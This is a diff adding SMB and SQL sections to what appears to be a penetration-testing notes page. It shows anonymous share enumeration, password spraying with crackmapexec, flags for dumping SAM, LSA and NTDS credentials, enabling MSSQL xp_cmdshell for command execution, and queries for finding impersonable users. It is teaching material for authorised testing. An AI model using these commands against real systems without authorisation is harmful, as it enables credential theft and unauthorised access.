@@ -102,6 +102,208 @@ On an FTP server you can't read files like on a normal machine with ```cat``` or
 
 ## SMB
 
-"Server Message Block (SMB) is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM[2] and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2." Wikipedia
+"Server Message Block (SMB) is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM[2] and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2." Wikipedia. Originaly ```SMB``` used port ```139``` but in more recent version you can see port ```445```.
 
+### List Shares
 
+When you know that the machine has a ```SMB``` service running you may want to know which ```shares``` is available / readable. ```smbclient``` and ```smbmap``` are two great tools for this purpose.
+
+```console
+smbclient -N -L \\\\IP
+```
+
+> Note the ```-N``` flag that we use to specify ```no password``` and the ```-L``` option to list all shares.
+{: .prompt-note }
+
+> If you have already a user, you can specify it with the ```-U``` flag.
+{: .prompt-tip }
+
+or
+
+```console
+smbmap -H IP
+```
+
+> To specify a user and or password with ```smbmap``` you can use the ```-u``` and ```-p``` flags.
+{: .prompt-tip }
+
+> If you want to list files from a share recursively with ```smbmap``` you can use the ```-r SHARE``` flag (replace SHARE with the share you want to list).
+{: .prompt-tip }
+
+### Access Shares
+
+Now that we know the shares we want to read, we can connect to the share folder.
+
+```console
+smbclient -U USER \\\\IP\\SHARE_NAME
+```
+
+Once connected, we can download or upload files like we've seen in the FTP section with ```get``` and ```put```. You can also use the ```cd``` and ```ls``` command to move in the share. With ```smbmap``` you can use the ```--download PATH/TO/FILE``` flag to download a file and the ```--upload SOURCE DESTINATION``` flag to upload a file.
+
+> You can execute command on the share with ```smbmap``` with the ```-x "COMMAND"``` flag.
+{: .prompt-tip }
+
+Where password brute force may cause damage on the server (block accounts) we are attacking, passwords spraying can be stealthier and cause fewer damages. Instead of brute forcing a password we can try to find users with passwords very often used. You also can perform pâssword spraying with [Hydra](https://nouman404.github.io/Notes/Brute_Force/Brute_Force#hydra)
+
+```console
+crackmapexec smb IP -u USER_LIST -p 'Company01!'
+```
+
+> When you found valid credentials you can try dumping credentials with ```crackmapexec``` using the ```--sam```, ```--lsa``` or the ```--ntds``` flag.
+{: .prompt-tip }
+
+## SQL
+
+There are many ```database management system``` (DBMS) but by default ```MSSQL``` uses port ```TCP/1433```, and ```MySQL``` uses ```TCP/3306```.
+
+### Connection
+
+To connect to MySQL and MSSQL is pretty similar. 
+
+- MySQL :
+
+**Linux**
+```console
+mysql -h DOMAIN_OR_IP -u USERNAME -pPASSWORD -P PORT DATABASE
+```
+
+> Note the if you don't know the databases that are on the host you can omit this parameter and select it after.
+{: .prompt-tip }
+
+> Note that there is no space between the ```-p``` flag and the password. You can use the ```-p``` flag without specifying the password at first and type it when asked.
+{: .prompt-danger }
+
+**Windows**
+```console
+sqlcmd -S DOMAIN_OR_IP -U USERNAME -P 'PASSWORD' -y 30 -Y 30
+```
+
+> The ```-y``` and ```-Y``` flag are used for better looking output.
+{: .prompt-tip }
+
+- MSSQL :
+
+```console
+sqsh -S DOMAIN_OR_IP -U SERVERNAME\\USERNAME -P 'PASSWORD' -h
+```
+
+> If you are looking for a local account you can put ```.\\USERNAME``` instead of giving a servername. 
+{: .prompt-tip }
+
+### SQL Commands
+
+For the commands we will use, the mysql commands are easier to type and remember.
+
+#### Show databases
+
+- MySQL :
+
+```console
+SHOW DATABASES;
+```
+
+- MSSQL :
+
+```console
+1> SELECT name FROM master.dbo.sysdatabases
+2> go
+```
+
+#### Select a Database
+
+- MySQL :
+
+```console
+USE DATABASES;
+```
+
+- MSSQL :
+
+```console
+1> USE name FROM master.dbo.sysdatabases
+2> go
+```
+
+#### Show Tables
+
+- MySQL :
+
+```console
+SHOW TABLES;
+```
+
+- MSSQL :
+
+```console
+1> SELECT table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES
+2> go
+```
+> Don't forget to specify the ```DATABASE_NAME``` in MSSQL.
+{: .prompt-warning  }
+
+#### Select all Data from a Table
+
+- MySQL :
+
+```console
+SELECT * FROM TABLE_NAME
+```
+
+- MSSQL :
+
+```console
+1> SELECT * FROM TABLE_NAME
+2> go
+```
+
+### Execute Commands
+
+With MSSQL you can execute command with ```xp_cmdshell``` by typing ```xp_cmdshell "COMMAND"```. 
+```console
+1> xp_cmdshell 'whoami'
+2> go
+```
+
+Note that if ```xp_cmdshell``` is not enable and if you have sufficient rights you can ```enable it``` with the following commands :
+
+1. To allow advanced options to be changed.
+
+```console
+1> EXECUTE sp_configure 'show advanced options', 1
+2> go
+```
+
+2. To update the currently configured value for advanced options.  
+
+```console
+1> RECONFIGURE
+2> go
+```
+
+3. To enable the feature.  
+
+```console
+1> EXECUTE sp_configure 'xp_cmdshell', 1
+2> go
+```
+
+4. To update the currently configured value for this feature.  
+
+```console
+1> RECONFIGURE
+2> go
+```
+
+### Impersonate Existing Users with MSSQL
+
+The executing user can take the permissions of another user thanks to a particular privilege in SQL Server called ```IMPERSONATE```.
+We must first find users who we can mimic. ```Sysadmins``` have the ability to impersonate anybody by default, but rights must be specifically granted to non-administrator users. In order to find users we can impersonate, we may perform the following query:
+
+```console
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+```
